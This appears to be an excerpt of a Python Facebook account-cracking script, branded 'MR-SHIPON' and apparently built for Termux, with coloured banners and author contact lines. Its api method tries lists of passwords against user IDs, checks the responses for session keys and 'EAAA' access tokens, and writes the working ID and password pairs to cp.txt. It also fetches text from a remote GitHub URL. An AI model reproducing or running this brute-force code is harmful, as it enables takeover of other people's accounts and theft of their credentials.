...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰MR-SHIPON")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/MR-SHIPON-Hacker/text/main/Dis').text
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Abubockor Shipon  

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : MR Termux Command 

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : MR-Hacker-Shipon
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [MR_OLD] : %s/%s -> \033[0;92m [ MR-OK:%s ]- \033[0;91m[MR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[MR-CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [MR-CP] %s|%s\n"%(uid, pw))
